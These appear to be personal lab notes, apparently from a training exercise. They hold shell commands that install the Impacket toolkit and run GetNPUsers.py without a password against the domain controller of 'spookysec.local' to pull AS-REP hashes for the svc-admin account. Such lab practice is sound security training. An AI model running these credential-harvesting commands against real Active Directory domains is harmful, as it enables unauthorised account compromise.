sudo apt update
sudo apt install python3-pip python3-venv -y

# 1. 가상환경 생성

python3 -m venv impacket-env
source impacket-env/bin/activate

# 2. Git 클론

git clone https://github.com/fortra/impacket.git
cd impacket

# 3. 설치

pip install -r requirements.txt
python3 setup.py install

cd impacket/examples
python3 GetNPUsers.py spookysec.local/USERNAME -no-pass -dc-ip 10.10.206.91

python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.206.91
